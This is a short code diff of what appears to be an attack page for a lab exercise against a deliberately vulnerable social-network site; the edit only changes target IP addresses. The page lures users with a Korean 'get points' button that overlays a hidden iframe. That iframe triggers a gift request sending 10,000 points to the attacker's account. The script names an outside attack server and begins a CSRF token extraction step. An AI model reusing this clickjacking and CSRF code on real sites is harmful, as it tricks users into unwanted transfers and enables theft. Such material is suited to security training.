@@ -91,7 +91,7 @@
         <div class="clickjacking-container">
             <button>💰 포인트 받기 💰</button>
             <iframe class="legitimate-button" 
-                    src="http://18.179.53.107/vulnerable-sns/www/profile.php?send_gift=1&receiver_id=1&points=10000"
+                    src="http://15.164.95.252/profile.php?send_gift=1&receiver_id=1&points=10000"
                     frameborder="0">
             </iframe>
         </div>
@@ -101,7 +101,7 @@
     
     <script>
         const ATTACKER_ID = '1';
-        const TARGET_SNS = 'http://18.179.53.107/vulnerable-sns/www';
+        const TARGET_SNS = 'http://15.164.95.252';
         const ATTACK_SERVER = 'http://13.158.67.78:5000';
         
         // 1. CSRF 토큰 추출 시도
